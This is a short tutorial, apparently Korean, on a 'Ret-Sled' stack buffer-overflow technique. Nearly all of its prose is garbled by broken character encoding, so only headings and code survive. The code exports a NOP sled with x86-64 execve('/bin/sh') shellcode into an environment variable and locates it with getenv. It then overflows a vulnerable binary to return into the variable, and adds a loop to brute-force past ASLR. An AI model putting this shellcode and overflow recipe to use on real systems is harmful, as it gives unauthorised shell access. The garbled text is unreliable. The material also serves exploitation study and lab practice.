# ENV�� �̿��� Ret-Sled 

ȯ�溯���� �̿��� Ret-Sled ���ݿ� ���� �˾ƺ��ô�.

## Ret-Sled ��?

Return Address�� ���ϴ� �ּҸ� �Է��� �� ȣ���Ͽ� �� ������ �����ϴ� ���� ���Ѵ�.

���� ������ �Լ��� Return �� �� ���� ����� �˾ƺ���.

---

## �Լ� Return ���

```
leave ���� ��ɾ�

mov rsp, rbp
pop rbp

ret ���� ���

pop rip
jmp rip
```

leave ������� rbp�� ���� �Լ��� rbp�� ���͵ǰ�, �� �� ������ top�� Return Address�� ����Ű�� �ִ�.

ret ������� eip�� Return Address�� �ְ� �ǰ�, eip�� jump ��, Return Address�� jump�ϰ� ����� ����ȴ�.

Ret-Sled�� �̷� ���� �̿��Ͽ� ���ϴ� ����� �����ϰ� �����.

---

## ENV�� �̿��� Ret-Sled ���

### 1. ȯ�� ���� ����

```shell
$export SHELLCODE=`python -c 'print "\x90"*300+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
```

�� �ּҷ� return �ؼ� ����� �����ϸ� `NOP`�� �����ϸ鼭 �������ٰ� �� �ڵ带 ���� ���� ���� �Ǵ� ���̴�.

### 2. ȯ�溯�� �ּ� �˾Ƴ���

``` c
#include<stdio.h>
#include<stdlib.h>

int main(void) {
    printf("%p\n",getenv("SHELLCODE"));
}
```

### 3. Return Address �������� ���� ũ�� ���ϱ�

### 4. �Է�

```shell
$(python -c 'print "a"*<ũ��>+"SHELLCODE �ּ�"'; cat) | ./bof(��������)
```
---

## �ٸ� Ret-Sled ���

Return Address ������ NOP�� �־� �� ���� �Էµ� NOP�� ����� ���� �ּҸ� Ȯ���Ѵ�.

�־� �� ���� �� ���� Ȯ���� �� �Է� �޴� �Լ� �ڷ� breakpoint�� �ɾ� rsp�� Ȯ���Ѵ�.

�� �ּҸ� Return Address �κп� �Է��ϰ� ������ NOP�� Shello Code(\x30~)�� �Է��Ѵ�.

ASLR�� ���� �ȵǾ� ������ �����ϰ�, ���� �Ǿ� ������

```shell
$while [ 1 ]; do <��ɾ�>; done; �� ������.
```